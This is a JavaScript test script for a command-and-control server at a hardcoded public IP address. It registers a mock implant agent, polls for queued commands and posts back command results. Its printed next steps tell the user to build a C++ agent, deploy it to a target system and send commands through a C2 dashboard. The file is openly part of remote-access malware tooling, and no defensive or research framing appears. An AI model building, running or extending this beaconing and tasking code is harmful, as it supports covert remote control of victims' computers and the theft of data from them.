const fetch = require('node-fetch');

const C2_SERVER = 'http://150.136.130.59:3002';

// Test agent data
const testAgent = {
    agent_id: 'test_agent_' + Date.now(),
    hostname: 'test-host',
    username: 'test-user',
    os_info: 'Windows 10 x64 | CPU: 8 cores | RAM: 16GB',
    ip_address: '192.168.1.100'
};

async function testC2Endpoints() {
    console.log('🧪 Testing C2 Agent Integration...\n');

    try {
        // Test 1: Agent Registration
        console.log('1. Testing agent registration...');
        const registerResponse = await fetch(`${C2_SERVER}/api/c2/register`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(testAgent)
        });

        if (registerResponse.ok) {
            const registerResult = await registerResponse.json();
            console.log('✅ Agent registration successful:', registerResult);
        } else {
            console.log('❌ Agent registration failed:', registerResponse.status, registerResponse.statusText);
            return;
        }

        // Test 2: Get Commands (should be empty initially)
        console.log('\n2. Testing command retrieval...');
        const commandsResponse = await fetch(`${C2_SERVER}/api/c2/commands/${testAgent.agent_id}`);
        
        if (commandsResponse.ok) {
            const commandsResult = await commandsResponse.json();
            console.log('✅ Commands retrieved successfully:', commandsResult);
        } else {
            console.log('❌ Command retrieval failed:', commandsResponse.status, commandsResponse.statusText);
        }

        // Test 3: Submit Command Result
        console.log('\n3. Testing result submission...');
        const testResult = {
            command_id: 1,
            agent_id: testAgent.agent_id,
            result_data: 'Test command executed successfully',
            success: true
        };

        const resultResponse = await fetch(`${C2_SERVER}/api/c2/result`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(testResult)
        });

        if (resultResponse.ok) {
            const resultResult = await resultResponse.json();
            console.log('✅ Result submission successful:', resultResult);
        } else {
            console.log('❌ Result submission failed:', resultResponse.status, resultResponse.statusText);
        }

        // Test 4: Test with admin token (simulate dashboard access)
        console.log('\n4. Testing admin endpoints...');
        
        // Note: This would require a valid admin token in a real scenario
        console.log('ℹ️  Admin endpoints require authentication - skipping for security');

        console.log('\n🎉 C2 Agent integration test completed successfully!');
        console.log('\n📋 Next steps:');
        console.log('1. Build the C++ agent using the provided build scripts');
        console.log('2. Deploy the agent to a target system');
        console.log('3. Monitor the agent in your C2 dashboard');
        console.log('4. Send commands through the dashboard interface');

    } catch (error) {
        console.error('❌ Test failed with error:', error.message);
        console.log('\n🔧 Troubleshooting:');
        console.log('1. Ensure the C2 server is running on port 3002');
        console.log('2. Check network connectivity to the server');
        console.log('3. Verify the server URL is correct');
        console.log('4. Check server logs for any errors');
    }
}

// Test server connectivity
async function testServerConnectivity() {
    console.log('🔍 Testing server connectivity...');
    
    try {
        const response = await fetch(`${C2_SERVER}/`);
        if (response.ok) {
            const data = await response.json();
            console.log('✅ Server is reachable:', data);
            return true;
        } else {
            console.log('❌ Server responded with error:', response.status);
            return false;
        }
    } catch (error) {
        console.log('❌ Cannot reach server:', error.message);
        return false;
    }
}

// Main test function
async function runTests() {
    console.log('🚀 Starting C2 Agent Integration Tests\n');
    
    // Test server connectivity first
    const serverReachable = await testServerConnectivity();
    if (!serverReachable) {
        console.log('\n❌ Cannot reach C2 server. Please check:');
        console.log('1. Server is running on port 3002');
        console.log('2. Network connectivity');
        console.log('3. Firewall settings');
        return;
    }
    
    // Run C2 endpoint tests
    await testC2Endpoints();
}

// Run tests if this script is executed directly
if (require.main === module) {
    runTests().catch(console.error);
}

module.exports = { testC2Endpoints, testServerConnectivity }; 